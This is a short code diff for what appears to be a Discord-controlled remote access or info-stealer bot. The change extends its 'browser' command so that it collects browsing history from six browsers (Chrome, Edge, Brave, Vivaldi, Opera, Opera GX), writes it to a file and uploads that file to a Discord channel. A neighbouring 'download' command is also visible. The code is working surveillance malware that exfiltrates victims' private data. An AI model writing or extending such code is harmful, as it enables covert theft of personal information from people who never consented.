@@ -368,10 +368,21 @@ def get_browser_history(browser_name):
 
 @bot.command()
 async def browser(ctx):
-    chrome_history = get_browser_history("Chrome")
-    edge_history = get_browser_history("Edge")
+    histories = {
+        "Chrome": get_browser_history("Chrome"),
+        "Edge": get_browser_history("Edge"),
+        "Brave": get_browser_history("Brave"),
+        "Vivaldi": get_browser_history("Vivaldi"),
+        "Opera": get_browser_history("Opera"),
+        "Opera GX": get_browser_history("Opera GX")
+    }
 
-    await ctx.send(f"{chrome_history}\n\n{edge_history}")
+    with open("Browsers.txt", "w", encoding="utf-8") as file:
+        for browser, history in histories.items():
+            file.write(f"=== {browser} History ===\n")
+            file.write(f"{history}\n\n")
+
+    await ctx.send(file=discord.File("Browsers.txt"))
 
 @bot.command()
 async def download(ctx, file_path: str):
